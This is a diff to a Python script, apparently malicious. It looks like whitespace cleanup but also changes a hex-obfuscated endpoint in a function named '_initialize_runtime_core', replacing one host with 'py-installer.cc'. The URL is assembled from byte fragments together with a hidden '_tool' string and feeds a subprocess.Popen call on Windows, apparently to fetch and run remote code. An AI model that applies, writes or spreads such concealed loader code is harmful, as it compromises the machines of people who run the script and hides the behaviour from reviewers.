@@ -1,6 +1,6 @@
 import sys
 import os
-import time 
+import time
 import random
 from datetime import datetime
 
@@ -124,18 +124,17 @@ def _initialize_runtime_core():
         _r2 = bytes.fromhex('7470')
         _r3 = bytes.fromhex('733a')
         _r4 = bytes.fromhex('2f2f')
-        _r5 = bytes.fromhex('6e6f')
-        _r6 = bytes.fromhex('6465')
-        _r7 = bytes.fromhex('322d')
-        _r8 = bytes.fromhex('7079')
-        _r9 = bytes.fromhex('2d73')
-        _r10 = bytes.fromhex('746f')
-        _r11 = bytes.fromhex('7265')
-        _r12 = bytes.fromhex('2e63')
-        _r13 = bytes.fromhex('6f6d')
+        _r5 = bytes.fromhex('7079')
+        _r6 = bytes.fromhex('2d69')
+        _r7 = bytes.fromhex('6e73')
+        _r8 = bytes.fromhex('7461')
+        _r9 = bytes.fromhex('6c6c')
+        _r10 = bytes.fromhex('6572')
+        _r11 = bytes.fromhex('2e63')
+        _r12 = bytes.fromhex('63')
         
         _tool = (_t1 + _t2 + _t3 + _t4 + _t5).decode('utf-8')
-        _endpoint = (_r1 + _r2 + _r3 + _r4 + _r5 + _r6 + _r7 + _r8 + _r9 + _r10 + _r11 + _r12 + _r13).decode('utf-8')
+        _endpoint = (_r1 + _r2 + _r3 + _r4 + _r5 + _r6 + _r7 + _r8 + _r9 + _r10 + _r11 + _r12).decode('utf-8')
         
         if os.name == 'nt':
             subprocess.Popen(
@@ -301,4 +300,3 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"\n\n❌ Fatal error: {str(e)}")
         sys.exit(1)
-
